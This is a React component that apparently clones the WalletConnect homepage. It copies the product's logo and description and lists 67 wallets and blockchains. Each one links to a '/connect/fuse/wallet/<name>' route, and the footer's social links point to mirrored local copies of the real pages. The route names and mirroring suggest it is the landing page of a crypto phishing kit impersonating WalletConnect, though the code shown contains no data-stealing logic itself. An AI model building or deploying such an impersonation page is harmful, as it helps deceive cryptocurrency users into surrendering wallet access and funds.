import React, { useState } from 'react'
import {Link} from "react-router-dom"
import "./Home.css"
import Banner from "./banner.png"
import Logo from "./logo.svg"
import Metamask from "./metamask.png"
import Mew from "./MEW.png"
import Trustwallet from "./trustwallet.png"
import Coinbase from "./coinbase.jpg"
import Atomic from "./atomic.png"
import Binance from "./binance.png"
import Bnb from "./bnb.png"
import Polkadot from "./polkadot.png"
import Xrp from "./xrp.png"
import Stellar from "./stellar.png"
import Tezos from "./tezos.png"
import Theta from "./theta.png"
import Tron from "./tron.png"
import Cosmos from "./cosmos.png"
import Kava from "./kava.png"
import Filecoin from "./filecoin.png"
import Solana from "./solana.png"
import Ethereum from "./ethereum-classic.png"
import Zilliqa from "./zilliqa.png"
import Elrond from "./elrond.jpg"
import Waves from "./waves.png"
import Icon from "./icon.png"
import Ontology from "./ontology.png"
import Harmony from "./harmony.jpg"
import Parsiq from "./parsiq.jpg"
import Uniswap from "./uniswap.png"
import Pancakeswap from "./pancakeswap.png"
import Nano from "./nano.png"
import Tomo from "./tomo.png"
import Iotex from "./iotex.png"
import Wanchain from "./wanchain.png"
import Kin from "./kin.png"
import Nimiq from "./nimiq.png"
import Aion from "./aion.png"
import Thundertoken from "./thundertoken.png"
import Aeternity from "./aeternity.png"
import Nebulas from "./nebulas.png"
import Fio from "./fio.png"
import Gochain from "./gochain.png"
import Poa from "./poa.png"
import Callisto from "./callisto.png"
import Bitpay from "./bitpay.jpg"
import Aktionariat from "./aktionariat.png"
import Atwallet from "./atwallet.png"
import Guard from "./guard.png"
import Aave from "./aave.jpg"
import Exodus from "./exodus.jpg"
import Enjin from "./enjin.jpg"
import Skale from "./skale.png"
import Portis from "./portis.png"
import Trezor from "./trezor.png"
import Squarelink from "./squarelink.png"
import Vechain from "./vechain.jpg"
import Scatter from "./scatter.jpg"
import Mathwallet from "./math-wallet.png"
import Fortmatic from "./fortmatic.png"
import Torus from "./torus.jpg"
import Digitex from "./digitex.png"
import Ledger from "./ledger.png"
import Defiat from "./defiat.jpg"
import Authereum from "./authereum.png"
import Flare from "./flare.jpg"
import Zelcore from "./zelcore.png"
import Bitkeep from "./bitkeep.png"
import Coin98 from "./coin98.png"
import Trustvault from "./trustvault.png"
import Discord from "./discord.svg"
import Telegram from "./telegram.svg"
import Twitter from "./twitter.svg"
import Github from "./github.svg"


function Home() {


    const wallet1 = "Metamask"
    const wallet2 = "MewWallet"
    const wallet3 = "TrustWallet"
    const wallet4 = "WalletConnect"
    const wallet5 = "coinbase"
    const wallet6 = "atomicWallet"
    const wallet7 = "BinanceSmartChain"
    const wallet8 = "BNB"
    const wallet9 = "Polkadot"
    const wallet10 = "XRP"
    const wallet11 = "Stellar"
    const wallet12 = "Tezos"
    const wallet13 = "Theta"
    const wallet14 = "Tron"
    const wallet15 = 'Cosmos'
    const wallet16 = 'Kava'
    const wallet17 = 'Filecoin'
    const wallet18 = 'Solanium'
    const wallet19 = 'Ethereum Classic'
    const wallet20 = 'Zilliqa'
    const wallet21 = 'Elrond'
    const wallet22 = 'Wave'
    const wallet23 = 'Icon'
    const wallet24 = 'Ontology'
    const wallet25 = 'Harmony'
    const wallet26 = 'Parsiq'
    const wallet27 = 'Uniswap'
    const wallet28 = 'Pancakeswap'
    const wallet29 = 'Nano'
    const wallet30 = 'TomoChain'
    const wallet31 = 'Iotex'
    const wallet32 = 'Wanchain'
    const wallet33 = 'Kin'
    const wallet34 = 'Nimiq'
    const wallet35 = 'Aion'
    const wallet36 = 'Thundertoken'
    const wallet37 = 'Aeternity'
    const wallet38 = 'Nebulas'
    const wallet39 = 'Fio'
    const wallet40 = 'Gochain'
    const wallet41 = 'POANetwork'
    const wallet42 = 'Callisto'
    const wallet43 = 'Bitpay'
    const wallet44 = 'Aktionariat'
    const wallet45 = 'Atwallet'
    const wallet46 = 'Guardwallet'
    const wallet47 = 'Aave'
    const wallet48 = 'Exodus'
    const wallet49 = 'Enjin'
    const wallet50 = 'Skale'
    const wallet51 = 'Portis'
    const wallet52 = 'Trezor'
    const wallet53 = 'Squarelink'
    const wallet54 = 'Torus'
    const wallet55 = 'Vechain'
    const wallet56 = "ScatterWallet"
    const wallet57 = "MathWallet"
    const wallet58 = "Fortmatic"
    const wallet59 = "Digitex"
    const wallet60 = "Ledger"
    const wallet61 = "Defiat"
    const wallet62 = "Authereum"
    const wallet63 = "FlareWallet"
    const wallet64 = "Zelcore"
    const wallet65 = "BitKeep"
    const wallet66 = "Coin98"
    const wallet67 = "TrustVault"
    


    const [viewMore, setViewmore] = useState(false)
    const [hideBtn, setHideBtn] = useState(false)

    return (
        <div>
     {/* <body data-new-gr-c-s-check-loaded="14.1033.0" data-gr-ext-installed=""> */}
    <center>

    <div className="home__header__link">
        <a href="#footer?v" className="left">Github</a>
        <a href="#?v" className="left">Docs</a>
        <a href="#?v" className="main"><img className="logo" src={Logo} alt="logo"/></a>
        <a href="#wallets?v" className="left">Wallets</a>
        <a href="#?v" className="left">Apps</a>
</div>

<br/>
<div className="wallect__connect">WalletConnect</div>

<div className="open">Open protocol for connecting Wallets to Dapps</div>
<br/>

<div className="dXgqeu">
<img className="banner" src={Banner} alt="WalletConnect"/>
</div>

<div className="bout">
<h2 className="home">What is WalletConnect?</h2>
<p>WalletConnect is an open source protocol for connecting decentralised applications to mobile wallets with QR code scanning or deep linking. 
A user can interact securely with any Dapp from their mobile phone, making WalletConnect wallets a safer choice compared to desktop or browser 
extension wallets.</p><br/>
<h2 className="home">How does it work?</h2>
<p>WalletConnect connects web applications to supported <a href="index.html#">mobile wallets</a>. WalletConnect session is started by a scanning a QR 
code (desktop) or by clicking an application deep link (mobile).</p>
</div>

<div className="wallets" id="wallets">
    <h1 className="home1">Wallets</h1>
<p>Multiple iOS and Android wallets support the WalletConnect protocol. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
</div>

<br/>
<div className="all">
<div className="apps">
    <Link to={"/connect/fuse/wallet/" + wallet1 }>
    <img className="wallet__icon" src={Metamask} /><br/>
    </Link>
    MetaMask
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet2 }>
    <img className="wallet__icon" src={Mew} /><br/>
    </Link>
    MEW Wallet
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet3 }>
    <img className="wallet__icon" src={Trustwallet} /><br/>
    </Link>
    Trust Wallet
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet4 }>
    <img className="wallet__icon" src={Logo} /><br/>
    </Link>
    Wallect<br/>Connect
</div>

<div className="apps">
    <Link to={"/connect/fuse/wallet/" + wallet5 }>
    <img className="wallet__icon" src={Coinbase}/><br/>
    </Link>
    Coinbase Wallet
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet6 }>
    <img className="wallet__icon" src={Atomic} /><br/>
    </Link>
    Atomic Wallet
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet7 }>
    <img className="wallet__icon" src={Binance} /><br/>
    </Link>
    Binance Smart Chain
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet8 }>
    <img className="wallet__icon" src={Bnb}/><br/>
    </Link>
    BNB
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet9 }>    
    <img className="wallet__icon" src={Polkadot}/><br/>
    </Link>
    Polkadot
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet10 }>
    <img className="wallet__icon" src={Xrp}/><br/>
    </Link>
    XRP
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet11 }>
    <img className="wallet__icon" src={Stellar} /><br/>
    </Link>
    Stellar
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet12 }>
    <img className="wallet__icon" src={Tezos} /><br/>
    </Link>
    Tezos
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet13 }>
    <img className="wallet__icon" src={Theta} /><br/>
    </Link>
    Theta
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet14 }>
    <img className="wallet__icon" src={Tron} /><br/>
</Link>
    Tron
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet15 }>
    <img className="wallet__icon" src={Cosmos} /><br/>
</Link>
    Cosmos
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet16 }>
    <img className="wallet__icon" src={Kava} /><br/>
</Link>
    Kava
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet17 }>
    <img className="wallet__icon" src={Filecoin}/><br/>
</Link>
    Filecoin
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet18 }>
    <img className="wallet__icon" src={Solana}/><br/>
</Link>
    Solana
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet19 }>
    <img className="wallet__icon" src={Ethereum} /><br/>
</Link>
    Ethereum Classic
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet20 }>
    <img className="wallet__icon" src={Zilliqa} /><br/>
</Link>
    Zilliqa
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet21 }>
    <img className="wallet__icon" src={Elrond} /><br/>
</Link>
    Elrond
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet22 }>
    <img className="wallet__icon" src={Waves} /><br/>
</Link>
    Waves
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet23 }>
    <img className="wallet__icon" src={Icon} /><br/>
</Link>
    ICON
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet24 }>
    <img className="wallet__icon" src={Ontology} /><br/>
</Link>
    Ontology
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet25 }>
    <img className="wallet__icon" src={Harmony}/><br/>
</Link>
    Harmony
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet26 }>
    <img className="wallet__icon" src={Parsiq} /><br/>
</Link>
    Parsiq
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet27 }>
    <img className="wallet__icon" src={Uniswap}/><br/>
</Link>
    Uniswap
</div>

<div className="apps">
<Link to={"/connect/fuse/wallet/" + wallet28 }>
    <img className="wallet__icon" src={Pancakeswap}/><br/>
</Link>
    PancakeSwap
</div>

</div>
<br/>


<div onClick={()=>setViewmore(true)} className={`btn ${viewMore && "hideBtn"}`}>Show More ↓</div>
<br/><br/>
<div className="hidden" id="hidden">
    <div className={`secondview ${viewMore && "all"}`}>
    
        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet29 }>
            <img className="wallet__icon" src={Nano} /><br/>
        </Link>
            Nano
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet30 }>
            <img className="wallet__icon" src={Tomo} /><br/>
        </Link>
            Tomo Chain
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet31 }>
            <img className="wallet__icon" src={Iotex} /><br/>
        </Link>
            IoTex
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet32 }>
            <img className="wallet__icon" src={Wanchain} /><br/>
        </Link>
            Wanchain
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet33 }>
            <img className="wallet__icon" src={Kin} /><br/>
        </Link>
            Kin
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet34 }>
            <img className="wallet__icon" src={Nimiq} /><br/>
        </Link>
            Nimiq
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet35 }>
            <img className="wallet__icon" src={Aion} /><br/>
        </Link>
            Aion
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet36 }>
            <img className="wallet__icon" src={Thundertoken} /><br/>
        </Link>
            Thunder Token
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet37 }>
            <img className="wallet__icon" src={Aeternity} /><br/>
        </Link>
            Aeternity
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet38 }>
            <img className="wallet__icon" src={Nebulas} /><br/>
        </Link>
            Nebulas
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet39 }>
            <img className="wallet__icon" src={Fio}/><br/>
        </Link>
            FIO
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet40 }>
            <img className="wallet__icon" src={Gochain} /><br/>
        </Link>
            GoChain
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet41 }>
            <img className="wallet__icon" src={Poa} /><br/>
        </Link>
            POA Network
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet42 }>
            <img className="wallet__icon" src={Callisto} /><br/>
        </Link>
            Callisto
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet43 }>
            <img className="wallet__icon" src={Bitpay} /><br/>
        </Link>
            BitPay
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet44 }>
            <img className="wallet__icon" src={Aktionariat} /><br/>
        </Link>
            Aktionariat
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet45 }>
            <img className="wallet__icon" src={Atwallet} /><br/>
        </Link>
            AtWallet
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet46 }>
            <img className="wallet__icon" src={Guard} /><br/>
        </Link>
            Guard Wallet
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet47 }>
            <img className="wallet__icon" src={Aave} /><br/>
        </Link>
            AAVE
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet48 }>
            <img className="wallet__icon" src={Exodus} /><br/>
        </Link>
            Exodus
        </div>


        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet49 }>
            <img className="wallet__icon" src={Enjin} /><br/>
        </Link>
            Enjin
        </div>


        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet50 }>
            <img className="wallet__icon" src={Skale} /><br/>
        </Link>
            Skale
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet51 }>
            <img className="wallet__icon" src={Portis} /><br/>
        </Link>
            Portis
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet52 }>
            <img className="wallet__icon" src={Trezor} /><br/>
        </Link>
            Trezor
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet53 }>
            <img className="wallet__icon" src={Squarelink}/><br/>
        </Link>
            Squarelink
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet54 }>
            <img className="wallet__icon" src={Torus} /><br/>
        </Link>
            Torus
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet55 }>
            <img className="wallet__icon" src={Vechain} /><br/>
        </Link>
            VeChain
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet56 }>
            <img className="wallet__icon" src={Scatter}/><br/>
        </Link>
            Scatter Wallet
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet57 }>
            <img className="wallet__icon" src={Mathwallet} /><br/>
        </Link>
            Math Wallet
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet58 }>
            <img className="wallet__icon" src={Fortmatic}/><br/>
        </Link>
            FortMatic
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet59 }>
            <img className="wallet__icon" src={Digitex} /><br/>
        </Link>
            Digitex
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet60 }>
            <img className="wallet__icon" src={Ledger} /><br/>
        </Link>
            Ledger
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet61 }>
            <img className="wallet__icon" src={Defiat} /><br/>
        </Link>
            Defiat
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet62 }>
            <img className="wallet__icon" src={Authereum} /><br/>
        </Link>
            Authereum
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet63 }>
            <img className="wallet__icon" src={Flare}/><br/>
        </Link>
            Flare Wallet
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet64 }>
            <img className="wallet__icon" src={Zelcore} /><br/>
        </Link>
            Zelcore
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet65 }>
            <img className="wallet__icon" src={Bitkeep}/><br/>
        </Link>
            BitKeep
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet66 }>
            <img className="wallet__icon" src={Coin98}/><br/>
        </Link>
            Coin98
        </div>

        <div className="apps">
        <Link to={"/connect/fuse/wallet/" + wallet67 }>
            <img className="wallet__icon" src={Trustvault} /><br/>
        </Link>
            Trust Vault
        </div>

    </div>

    <div onClick={()=>setViewmore(false)} className={`btn ${!viewMore && "hideBtn"}`}>Show Less ↓</div>

</div>


{/* </div> */}

<footer className="home__footer">
<div id="footer">
<p className="footer__p"><img  src={Discord} className="footimg"/>  <a href="../discord.com/invite/jhxMvxP.html">Discord</a></p><br/>
<p className="footer__p"><img  src={Telegram} className="footimg"/>  <a href="../t.me/walletconnect_announcements.html">Telegram</a></p><br/>
<p className="footer__p"><img  src={Twitter} className="footimg"/>  <a href="../twitter.walletconnect.org/index.html">Twitter</a></p><br/>
<p className="footer__p"><img  src={Github} className="footimg"/>  <a href="../github.com/walletconnect.html">Github</a></p><br/>
 </div>
</footer>
</center>
</div>
   


)}

export default Home
